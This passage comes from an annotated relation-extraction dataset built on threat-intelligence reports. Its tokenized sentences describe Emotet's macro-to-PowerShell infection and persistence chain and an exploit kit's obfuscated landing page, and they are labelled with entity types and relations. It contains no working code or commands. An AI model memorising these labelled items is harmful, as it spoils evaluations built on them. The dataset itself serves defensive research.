126], "name": "rundll32.exe", "pos": [1, 2], "index": "24_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [141, 141], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [16, 23], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [151, 151], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME >", "pos": [26, 33], "index": "26_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "ST", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "FR", "evidence": [2], "h": 5, "t": 8}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [3], "h": 10, "t": 13}, {"r": "WR", "evidence": [3], "h": 10, "t": 14}, {"r": "FR", "evidence": [3, 4], "h": 10, "t": 15}, {"r": "CO", "evidence": [3, 4, 5], "h": 14, "t": 19}, {"r": "EX", "evidence": [3, 4], "t": 14, "h": 15}, {"r": "FR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "ST", "evidence": [4], "h": 16, "t": 18}, {"r": "RF", "evidence": [4], "h": 16, "t": 18}, {"r": "FR", "evidence": [4, 5, 6], "h": 16, "t": 22}, {"r": "CO", "evidence": [4, 5, 6], "h": 17, "t": 21}, {"r": "RD", "evidence": [4, 5], "t": 17, "h": 20}, {"r": "EX", "evidence": [6], "t": 21, "h": 22}, {"r": "FR", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 25}, {"r": "RD", "evidence": [6, 7], "h": 22, "t": 26}, {"r": "CO", "evidence": [6, 7], "h": 22, "t": 24}, {"r": "RD", "evidence": [7], "h": 24, "t": 25}, {"r": "WR", "evidence": [7], "h": 24, "t": 26}]}, {"title": "13_g02-1", "sents": [["As", "a", "result", ",", "new", "malicious", "email", "campaigns", "that", "directly", "deliver", "Emotet", "to", "victims", "emerged", "."], ["These", "campaigns", "target", "victims", "with", "email", "thread", "hijacking", "and", "typically", "include", "an", "attached", "downloader", "file", "that", "retrieves", "the", "Emotet", "payload", "."], ["Emotet", "uses", "various", "types", "of", "archives", "including", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "which", "contain", "OLE2", "macros", "."], ["When", "these", "macros", "are", "executed", "and", "it", "invokes", "PowerShell", ",", "which", "retrieves", "the", "Emotet", "DLL", "from", "an", "attacker-controlled", "distribution", "server", "."], ["The", "macros", "are", "obfuscated", ",", "however", ",", "the", "PowerShell", "invocation", "is", "revealed", "after", "being", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "by", "rundll32.exe", ",", "infecting", "the", "system", "with", "Emotet", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "stored", "in", "a", "random", "filename", "in", "either", "the", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''", "directories", "to", "achieve", "persistence", "."], ["A", "Windows", "Service", "is", "registered", "to", "run", "the", "malware", "after", "system", "reboots", "to", "sustain", "this", "persistence", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "email campaigns", "pos": [6, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "Emotet", "pos": [11, 12], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "victims", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "campaigns", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [19, 19], "name": "victims", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "email", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "attached downloader file", "pos": [12, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "Emotet payload", "pos": [18, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "Emotet", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "DOCM", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "XLSM", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "password-protected ZIP", "pos": [12, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "OLE2 macros", "pos": [16, 18], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "macros", "pos": [2, 3], "index": "13_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [64, 64], "name": "PowerShell", "pos": [8, 9], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "Emotet DLL", "pos": [13, 15], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [74, 74], "name": "distribution server", "pos": [18, 20], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "macros", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "PowerShell", "pos": [8, 9], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "DLL", "pos": [1, 2], "index": "19_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [101, 101], "name": "rundll32.exe", "pos": [6, 7], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "Emotet", "pos": [12, 13], "index": "21_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [110, 110], "name": "rundll32.exe", "pos": [1, 2], "index": "22_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [125, 125], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [16, 23], "index": "23_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [135, 135], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME >", "pos": [26, 33], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "Windows Service", "pos": [1, 3], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [1], "h": 6, "t": 7}, {"r": "EX", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "WR", "evidence": [2], "h": 8, "t": 11}, {"r": "WR", "evidence": [2], "h": 8, "t": 12}, {"r": "FR", "evidence": [2, 3], "h": 8, "t": 13}, {"r": "CO", "evidence": [2, 3, 4], "h": 12, "t": 17}, {"r": "EX", "evidence": [2, 3], "t": 12, "h": 13}, {"r": "FR", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3], "h": 14, "t": 15}, {"r": "ST", "evidence": [3], "h": 14, "t": 16}, {"r": "RF", "evidence": [3], "h": 14, "t": 16}, {"r": "FR", "evidence": [3, 4, 5], "h": 14, "t": 20}, {"r": "CO", "evidence": [3, 4, 5], "h": 15, "t": 19}, {"r": "RD", "evidence": [3, 4], "t": 15, "h": 18}, {"r": "EX", "evidence": [5], "t": 19, "h": 20}, {"r": "FR", "evidence": [5], "h": 20, "t": 21}, {"r": "RD", "evidence": [5, 6], "h": 21, "t": 23}, {"r": "RD", "evidence": [5, 6], "h": 21, "t": 23}, {"r": "WR", "evidence": [5, 6], "h": 21, "t": 23}, {"r": "RD", "evidence": [5, 6], "h": 20, "t": 24}, {"r": "CO", "evidence": [5, 6], "h": 20, "t": 22}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "h": 22, "t": 24}, {"r": "RD", "evidence": [6, 7], "t": 24, "h": 25}, {"r": "RD", "evidence": [6, 7], "t": 24, "h": 25}, {"r": "WR", "evidence": [6, 7], "t": 24, "h": 25}]}, {"title": "13_g02-2", "sents": [["These", "campaigns", "target", "victims", "with", "email", "thread", "hijacking", "and", "typically", "include", "an", "attached", "downloader", "file", "that", "retrieves", "the", "Emotet", "payload", "."], ["Emotet", "uses", "various", "types", "of", "archives", "including", "DOCM", ",", "XLSM", ",", "and", "password-protected", "ZIP", "which", "contain", "OLE2", "macros", "."], ["When", "these", "macros", "are", "executed", "and", "it", "invokes", "PowerShell", ",", "which", "retrieves", "the", "Emotet", "DLL", "from", "an", "attacker-controlled", "distribution", "server", "."], ["The", "macros", "are", "obfuscated", ",", "however", ",", "the", "PowerShell", "invocation", "is", "revealed", "after", "being", "deobfuscated", "at", "runtime", "."], ["The", "DLL", "is", "then", "executed", "by", "rundll32.exe", ",", "infecting", "the", "system", "with", "Emotet", "."], ["Once", "rundll32.exe", "executes", ",", "the", "DLL", "is", "stored", "in", "a", "random", "filename", "in", "either", "the", "``", "C", ":", "\\\\ProgramData\\\\", "<", "RANDOM", "FILENAME", ">", "''", "or", "``", "C", ":", "\\Windows\\SysWOW64\\", "<", "RANDOM", "FILENAME", ">", ".", "''", "directories", "to", "achieve", "persistence", "."], ["A", "Windows", "Service", "is", "registered", "to", "run", "the", "malware", "after", "system", "reboots", "to", "sustain", "this", "persistence", "."], ["Infected", "machines", "establish", "a", "C2", "communication", "channel", "and", "receive", "instructions", "that", "allow", "attackers", "to", "use", "them", "for", "additional", "spam", "distribution", ",", "effectively", "expanding", "their", "distribution", "campaigns", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "campaigns", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [3, 3], "name": "victims", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "email", "pos": [5, 6], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "attached downloader file", "pos": [12, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "Emotet payload", "pos": [18, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "Emotet", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "DOCM", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "XLSM", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "password-protected ZIP", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "OLE2 macros", "pos": [16, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "macros", "pos": [2, 3], "index": "10_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [48, 48], "name": "PowerShell", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "Emotet DLL", "pos": [13, 15], "index": "12_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [58, 58], "name": "distribution server", "pos": [18, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "macros", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "PowerShell", "pos": [8, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [80, 80], "name": "DLL", "pos": [1, 2], "index": "16_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [85, 85], "name": "rundll32.exe", "pos": [6, 7], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "Emotet", "pos": [12, 13], "index": "18_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [94, 94], "name": "rundll32.exe", "pos": [1, 2], "index": "19_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [109, 109], "name": "C : \\\\ProgramData\\\\ < RANDOM FILENAME >", "pos": [16, 23], "index": "20_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [119, 119], "name": "C : \\Windows\\SysWOW64\\ < RANDOM FILENAME >", "pos": [26, 33], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "Windows Service", "pos": [1, 3], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "Infected machines", "pos": [0, 2], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [154, 154], "name": "C2", "pos": [4, 5], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [168, 168], "name": "spam distribution", "pos": [18, 20], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 3, "t": 4}, {"r": "EX", "evidence": [0, 1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 8}, {"r": "WR", "evidence": [1], "h": 5, "t": 9}, {"r": "FR", "evidence": [1, 2], "h": 5, "t": 10}, {"r": "CO", "evidence": [1, 2, 3], "h": 9, "t": 14}, {"r": "EX", "evidence": [1, 2], "t": 9, "h": 10}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "ST", "evidence": [2], "h": 11, "t": 13}, {"r": "RF", "evidence": [2], "h": 11, "t": 13}, {"r": "FR", "evidence": [2, 3, 4], "h": 11, "t": 17}, {"r": "CO", "evidence": [2, 3, 4], "h": 12, "t": 16}, {"r": "RD", "evidence": [2, 3], "t": 12, "h": 15}, {"r": "EX", "evidence": [4], "t": 16, "h": 17}, {"r": "FR", "evidence": [4], "h": 17, "t": 18}, {"r": "RD", "evidence": [4, 5], "h": 18, "t": 20}, {"r": "RD", "evidence": [4, 5], "h": 18, "t": 20}, {"r": "WR", "evidence": [4, 5], "h": 18, "t": 20}, {"r": "RD", "evidence": [4, 5], "h": 17, "t": 21}, {"r": "CO", "evidence": [4, 5], "h": 17, "t": 19}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 21}, {"r": "RD", "evidence": [5, 6], "t": 21, "h": 22}, {"r": "RD", "evidence": [5, 6], "t": 21, "h": 22}, {"r": "WR", "evidence": [5, 6], "t": 21, "h": 22}, {"r": "ST", "evidence": [6, 7], "h": 22, "t": 24}, {"r": "RF", "evidence": [6, 7], "h": 22, "t": 24}, {"r": "FR", "evidence": [7], "t": 23, "h": 25}, {"r": "ST", "evidence": [7], "h": 23, "t": 24}, {"r": "RF", "evidence": [7], "h": 23, "t": 24}, {"r": "RD", "evidence": [5, 6, 7], "t": 21, "h": 23}]}, {"title": "650-0", "sents": [["It", "achieves", "this", "through", "a", "couple", "of", "components", ":", "a", "traffic", "direction", "system", "(", "TDS", ")", "or", "gate", ",", "landing", "page", "and", "exploit", "page", "."], ["In", "this", "case", ",", "the", "actual", "gate", "is", "being", "hosted", "at", "ezylifebags.com.au", "with", "a", "302", "cushion", "."], ["However", ",", "this", "request", "does", "n't", "result", "in", "anything", "but", "additional", "requests", "for", "the", "same", "file", "via", "301", "redirect", "and", "could", "be", "used", "as", "an", "additional", "tracker", "to", "ensure", "the", "victim", "is", "getting", "to", "the", "gate", "via", "the", "proper", "channels", ",", "a", "compromised", "website", ",", "and", "are", "not", "direct", "connects", "from", "researchers", "."], ["It", "'s", "at", "this", "point", "that", "the", "exploit", "kit", "itself", "becomes", "involved", "."], ["This", "starts", "with", "a", "request", "for", "the", "landing", "page", "."], ["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."]], "vertexSet": [[{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "ezylifebags.com.au", "pos": [11, 12], "index": "0_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "gate", "pos": [35, 36], "index": "1_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [163, 163], "name": "attackers", "pos": [21, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "actors", "pos": [19, 20], "index": "3_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "ST", "evidence": [1, 2, 3, 4, 5, 6], "t": 0, "h": 2}, {"r": "RF", "evidence": [1, 2, 3, 4, 5, 6], "t": 0, "h": 2}, {"r": "CO", "evidence": [6, 7], "h": 2, "t": 3}, {"r": "ST", "evidence": [2, 3, 4, 5, 6, 7], "t": 1, "h": 3}, {"r": "RF", "evidence": [2, 3, 4, 5, 6, 7], "t": 1, "h": 3}]}, {"title": "650-1", "sents": [["In", "this", "case", ",", "the", "actual", "gate", "is", "being", "hosted", "at", "ezylifebags.com.au", "with", "a", "302", "cushion", "."], ["However", ",", "this", "request", "does", "n't", "result", "in", "anything", "but", "additional", "requests", "for", "the", "same", "file", "via", "301", "redirect", "and", "could", "be", "used", "as", "an", "additional", "tracker", "to", "ensure", "the", "victim", "is", "getting", "to", "the", "gate", "via", "the", "proper", "channels", ",", "a", "compromised", "website", ",", "and", "are", "not", "direct", "connects", "from", "researchers", "."], ["It", "'s", "at", "this", "point", "that", "the", "exploit", "kit", "itself", "becomes", "involved", "."], ["This", "starts", "with", "a", "request", "for", "the", "landing", "page", "."], ["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "ezylifebags.com.au", "pos": [11, 12], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "gate", "pos": [35, 36], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "attackers", "pos": [21, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "actors", "pos": [19, 20], "index": "3_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "vulnerability", "pos": [23, 24], "index": "4_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 2}, {"r": "RF", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 2}, {"r": "CO", "evidence": [5, 6], "h": 2, "t": 3}, {"r": "ST", "evidence": [1, 2, 3, 4, 5, 6], "t": 1, "h": 3}, {"r": "RF", "evidence": [1, 2, 3, 4, 5, 6], "t": 1, "h": 3}, {"r": "WR", "evidence": [6, 7], "h": 3, "t": 4}]}, {"title": "650-2", "sents": [["However", ",", "this", "request", "does", "n't", "result", "in", "anything", "but", "additional", "requests", "for", "the", "same", "file", "via", "301", "redirect", "and", "could", "be", "used", "as", "an", "additional", "tracker", "to", "ensure", "the", "victim", "is", "getting", "to", "the", "gate", "via", "the", "proper", "channels", ",", "a", "compromised", "website", ",", "and", "are", "not", "direct", "connects", "from", "researchers", "."], ["It", "'s", "at", "this", "point", "that", "the", "exploit", "kit", "itself", "becomes", "involved", "."], ["This", "starts", "with", "a", "request", "for", "the", "landing", "page", "."], ["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [35, 35], "name": "gate", "pos": [35, 36], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "attackers", "pos": [21, 22], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [142, 142], "name": "actors", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "vulnerability", "pos": [23, 24], "index": "3_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "code", "pos": [1, 2], "index": "4_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [183, 183], "name": "system", "pos": [6, 7], "index": "5_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [190, 190], "name": "information", "pos": [13, 14], "index": "6_0"}]], "labels": [{"r": "RD", "evidence": [4, 5, 6, 7], "h": 1, "t": 5}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 1, "t": 5}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 1, "t": 5}, {"r": "CO", "evidence": [4, 5], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 2}, {"r": "RF", "evidence": [0, 1, 2, 3, 4, 5], "t": 0, "h": 2}, {"r": "WR", "evidence": [5, 6], "h": 2, "t": 3}, {"r": "FR", "evidence": [5, 6, 7], "h": 2, "t": 4}, {"r": "EX", "evidence": [6, 7], "t": 3, "h": 4}, {"r": "RD", "evidence": [7], "h": 4, "t": 5}, {"r": "RD", "evidence": [7], "h": 4, "t": 6}]}, {"title": "650-3", "sents": [["It", "'s", "at", "this", "point", "that", "the", "exploit", "kit", "itself", "becomes", "involved", "."], ["This", "starts", "with", "a", "request", "for", "the", "landing", "page", "."], ["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "attackers", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "actors", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [122, 122], "name": "vulnerability", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "code", "pos": [1, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [130, 130], "name": "system", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [137, 137], "name": "information", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "path", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "CVE-2018-15982", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "Spelevo", "pos": [29, 30], "index": "8_0"}]], "labels": [{"r": "RD", "evidence": [3, 4, 5, 6], "h": 0, "t": 4}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 0, "t": 4}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 0, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 0, "t": 1}, {"r": "WR", "evidence": [4, 5], "h": 1, "t": 2}, {"r": "FR", "evidence": [4, 5, 6], "h": 1, "t": 3}, {"r": "EX", "evidence": [5, 6], "t": 2, "h": 3}, {"r": "RD", "evidence": [6], "h": 3, "t": 4}, {"r": "RD", "evidence": [6], "h": 3, "t": 5}, {"r": "FR", "evidence": [6, 7], "h": 3, "t": 6}, {"r": "EX", "evidence": [7], "h": 6, "t": 7}, {"r": "CO", "evidence": [7], "h": 7, "t": 8}]}, {"title": "650-4", "sents": [["This", "starts", "with", "a", "request", "for", "the", "landing", "page", "."], ["As", "shown", "below", ",", "at", "the", "top", "of", "the", "document", "there", "appeared", "to", "be", "a", "base64-encoded", "blob", "that", "was", "assigned", "to", "a", "variable", "."], ["However", ",", "there", "was", "a", "failed", "attempt", "at", "decoding", ",", "which", "led", "to", "the", "discovery", "of", "an", "extra", "effort", "by", "the", "attackers", "."], ["When", "we", "began", "analyzing", "the", "code", "on", "the", "page", ",", "we", "found", "why", "the", "decoding", "was", "failing", ":", "The", "actors", "used", "rot13", "encoding", "first", ",", "as", "highlighted", "below", "."], ["Once", "we", "decoded", "the", "rot13", "and", "then", "decoded", "the", "resulting", "base64", ",", "we", "found", "the", "code", "needed", "to", "probe", "the", "system", "to", "determine", "vulnerability", "."], ["This", "code", "will", "probe", "the", "operating", "system", ",", "web", "browser", ",", "and", "plugin", "information", "."], ["If", "a", "vulnerable", "version", "of", "flash", "is", "found", ",", "the", "first", "path", "is", "taken", "which", "likely", "leads", "to", "CVE-2018-15982", ",", "which", "has", "been", "widely", "abused", "by", "exploit", "kits", "including", "Spelevo", "."], ["If", "a", "match", "is", "n't", "found", ",", "the", "second", "path", "is", "followed", ",", "which", "delivers", "another", "exploit", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "attackers", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "actors", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "vulnerability", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "code", "pos": [1, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [117, 117], "name": "system", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [124, 124], "name": "information", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "path", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [144, 144], "name": "CVE-2018-15982", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "Spelevo", "pos": [29, 30], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "path", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [173, 173], "name": "exploit", "pos": [16, 17], "index": "10_0"}]], "labels": [{"r": "RD", "evidence": [2, 3, 4, 5], "h": 0, "t": 4}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 0, "t": 4}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 0, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 0, "t": 1}, {"r": "WR", 